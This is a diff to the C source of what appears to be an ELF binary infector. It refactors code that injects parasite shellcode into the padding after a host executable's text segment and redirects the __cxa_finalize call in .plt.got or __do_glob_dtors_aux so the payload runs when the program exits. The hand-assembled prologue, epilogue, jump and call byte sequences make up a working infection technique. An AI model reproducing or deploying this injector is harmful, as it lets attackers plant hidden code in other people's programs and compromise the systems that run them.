@@ -3,45 +3,31 @@
 long PAGE_SIZE = 0;
 uint8_t options = 0;
 
-#define RET 0xc3
+#define RET         0xc3
+#define PUSH_RDI    0x57
 
 const uint8_t qwordcmp[] = { 0x48, 0x83, 0x3d };
 const uint8_t qwordcall[] = { 0xff, 0x15 };
 
-#define PLTGOT_PROLOGUE_LEN     1
-uint8_t pltgot_prologue[] = {
-    0x57,                                       // push rdi
-};
+#define PROLOGUE_LEN        1
+#define EPILOGUE_LEN        7
+#define EPILOGUE_JMPOFFT    1
 
-#define PLTGOT_EPILOGUE_LEN     7
-#define PLTGOT_EPILOGUE_JMPOFFT  1
-uint8_t pltgot_epilogue[PLTGOT_EPILOGUE_LEN] = {
+#define PLTOGOT_WRAP_LEN    (PROLOGUE_LEN + EPILOGUE_LEN)
+#define DTORS_WRAP_LEN      (PROLOGUE_LEN + EPILOGUE_LEN + 1)
+
+uint8_t epilogue[EPILOGUE_LEN] = {
   0x5f,                                         // pop rdi
   0xff, 0x25, 0x00, 0x00, 0x00, 0x00,           // jmp QWORD PTR [rip + ?]
-};
-
-#define DTORS_PROLOGUE_LEN      6
-uint8_t dtors_prologue[DTORS_PROLOGUE_LEN] = {
-  0x59,                                         // pop rsi
-  0x48, 0xff, 0xc1,                             // inc rsi
-  0x51,                                         // push rsi
-  0x57,                                         // push rdi
-};
-
-#define DTORS_EPILOGUE_LEN      8
-#define DTORS_EPILOGUE_JMPOFFT  1
-uint8_t dtors_epilogue[DTORS_EPILOGUE_LEN] = {
-  0x5f,                                         // pop rdi
-  0xff, 0x25, 0x00, 0x00, 0x00, 0x00,           // jmp QWORD PTR [rip + ?]
-  0xc3,                                         // ret
 };
 
 uint8_t jump[5] = {
-    0xe9, 0x00, 0x00, 0x00, 0x00,
+    0xe9, 0x00, 0x00, 0x00, 0x00, // jmp ?
 };
 
-uint8_t call[5] = {
-    0xe8, 0x00, 0x00, 0x00, 0x00,
+uint8_t call[6] = {
+    0xe8, 0x00, 0x00, 0x00, 0x00, // call ?
+    0x90                          // nop
 };
 
 // If file_len contains a non-zero value, the file will be
@@ -309,7 +295,7 @@ static int find_cxafin_pltgot(struct parasite_host *host)
             saved_offt = *(uint32_t *)&plt_got[i+2];
             if (cxafin_bytes == (&plt_got[i+6] + saved_offt)) {
                 DBG("[DEBUG] code offset:\t\t0x%x\n", saved_offt);
-                memcpy(&pltgot_epilogue[PLTGOT_EPILOGUE_JMPOFFT],
+                memcpy(&epilogue[EPILOGUE_JMPOFFT],
                        &plt_got[i], 6);
                 host->jmp_to_payload = &plt_got[i];
                 return 0;
@@ -324,13 +310,12 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
     uint64_t i,j;
     uint64_t bytes_after_text;
     Elf64_Addr infect_vaddr = 0;
-    uint8_t *end_of_text,
-            *prologue,
-            *epilogue;
-    size_t prologue_len,
-           epilogue_len,
-           shellcode_jmp_offt,
-           shellcode_len = parasite->text_size;
+    uint8_t *end_of_text;
+
+    // total length of the parasite
+    size_t shellcode_len = parasite->text_size;
+
+    // length of the instruction we are overwriting
     uint32_t inst_len;
 
 
@@ -339,24 +324,14 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
             ERR("mamma_mia: Can't hijack __cxa_finalize in .plt.got: not found\n");
             return -1;
         }
-        prologue = pltgot_prologue;
-        prologue_len = PLTGOT_PROLOGUE_LEN;
-        epilogue = pltgot_epilogue;
-        epilogue_len = PLTGOT_EPILOGUE_LEN;
-        shellcode_len += (PLTGOT_PROLOGUE_LEN + PLTGOT_EPILOGUE_LEN);
-        shellcode_jmp_offt = PLTGOT_EPILOGUE_JMPOFFT;
+        shellcode_len += PLTOGOT_WRAP_LEN;
         inst_len = 6;
     } else if (HIJACK_DTORS(options)) {
         if (!host->do_glob_dtors) {
             ERR("mamma_mia: Can't hijack __cxa_finalize in __do_glob_dtors_aux: not found\n");
             return -1;
         }
-        prologue = dtors_prologue;
-        prologue_len = DTORS_PROLOGUE_LEN;
-        epilogue = dtors_epilogue;
-        epilogue_len = DTORS_EPILOGUE_LEN;
-        shellcode_jmp_offt = DTORS_EPILOGUE_JMPOFFT;
-        shellcode_len += (DTORS_PROLOGUE_LEN + DTORS_EPILOGUE_LEN);
+        shellcode_len += DTORS_WRAP_LEN;
         inst_len = 7;
     } else {
         ERR("mamma_mia: Invalid options\n");
@@ -366,10 +341,10 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
     for (i=0; i < host->elf->e_phnum; i++) {
         if (host->phdrs[i].p_type == PT_LOAD) {
             if (host->phdrs[i].p_flags & PF_X) {
-                uint64_t total_segment_size = parasite->total_size +
+                uint64_t total_segment_size = shellcode_len +
                                               (host->phdrs[i].p_memsz%PAGE_SIZE);
 
-                if ((total_segment_size <  parasite->total_size) ||
+                if ((total_segment_size <  shellcode_len) ||
                     (total_segment_size > PAGE_SIZE)) {
                     ERR("mamma_mia: parasite is too large\n");
                     return -1;
@@ -407,14 +382,16 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
         }
     }
 
-    uint32_t *rel_cxa_finalize = (uint32_t *)&epilogue[shellcode_jmp_offt+2];
+    uint32_t *rel_cxa_finalize = (uint32_t *)&epilogue[EPILOGUE_JMPOFFT+2];
     *rel_cxa_finalize -= (((uint64_t)end_of_text+shellcode_len-inst_len) -
                           (uint64_t)host->jmp_to_payload);
 
     memcpy(host->scratch_space, end_of_text, bytes_after_text);
-    memcpy(end_of_text, prologue, prologue_len);
-    memcpy(end_of_text+prologue_len, parasite->text_bytes, parasite->text_size);
-    memcpy(end_of_text+prologue_len+parasite->text_size, epilogue, epilogue_len);
+    *end_of_text = PUSH_RDI;
+    memcpy(end_of_text+PROLOGUE_LEN, parasite->text_bytes, parasite->text_size);
+    memcpy(end_of_text+PROLOGUE_LEN+parasite->text_size, epilogue, EPILOGUE_LEN);
+    if (HIJACK_DTORS(options))
+        *(end_of_text + PROLOGUE_LEN + parasite->text_size + EPILOGUE_LEN) = RET;
     memcpy(end_of_text+PAGE_SIZE, host->scratch_space, bytes_after_text);
     host->elf->e_shoff += PAGE_SIZE;
 
@@ -428,7 +405,7 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
         memcpy(host->jmp_to_payload, jump, 5);
     } else if (HIJACK_DTORS(options)) {
         *(uint32_t *)&call[1] = offt;
-        memcpy(host->jmp_to_payload, call, 5);
+        memcpy(host->jmp_to_payload, call, 6);
     }
 
     return 0;
@@ -457,7 +434,7 @@ static int find_cxafin_dtors(struct parasite_host *host)
             saved_offt = *(uint32_t *)&host->do_glob_dtors[i+2];
             if (cxafin_bytes == &host->do_glob_dtors[i+6] + saved_offt) {
                 DBG("[DEBUG] Found __cxa_finalize\t@%p\n", cxafin_bytes);
-                memcpy(&dtors_epilogue[DTORS_EPILOGUE_JMPOFFT],
+                memcpy(&epilogue[EPILOGUE_JMPOFFT],
                        &host->do_glob_dtors[i], 6);
                 host->jmp_to_payload = &host->do_glob_dtors[i];
                 return 0;
@@ -540,9 +517,6 @@ int main(int argc, char **argv)
 
     // what you doin?
     if (HIJACK_PLT(options)) {
-        parasite.total_size = parasite.text_size + PLTGOT_PROLOGUE_LEN+
-                              PLTGOT_EPILOGUE_LEN;
-
         if (!host.plt_got) {
             ERR("fatal: failed to find .plt.got section\n");
             goto free_exit;
@@ -553,9 +527,6 @@ int main(int argc, char **argv)
             goto free_exit;
         }
     } else if (HIJACK_DTORS(options)) {
-        parasite.total_size = parasite.text_size + DTORS_PROLOGUE_LEN +
-                              DTORS_EPILOGUE_LEN;
-
         if (!host.do_glob_dtors) {
             ERR("fatal: failed to find __do_glob_dtors_aux function\n");
             goto free_exit;
